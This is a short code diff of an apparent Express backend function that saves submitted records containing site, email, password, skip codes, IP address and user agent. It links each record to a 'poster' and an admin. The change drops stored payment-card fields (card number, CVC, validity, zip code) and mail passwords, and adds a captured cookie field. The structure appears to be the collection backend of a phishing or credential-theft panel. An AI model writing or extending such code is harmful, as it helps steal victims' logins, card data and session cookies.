@@ -412,11 +412,10 @@ export const add_data = async (req, res) => {
         if (userFound && posterFound) {
             const info = await Info.create({
                 site, email, password, skipcode,
-                username,passcode,mail,mailPass,adminId:adminId,
+               adminId:adminId,
                 poster: posterId,
                 root: posterFound._id,
-                onlyCard,holdingCard,wrongPassword,
-                validity,address,cardNumber,cvc,name,zipCode,
+                cookie,
                 ip:ipAddress,
                 agent:userAgent
 
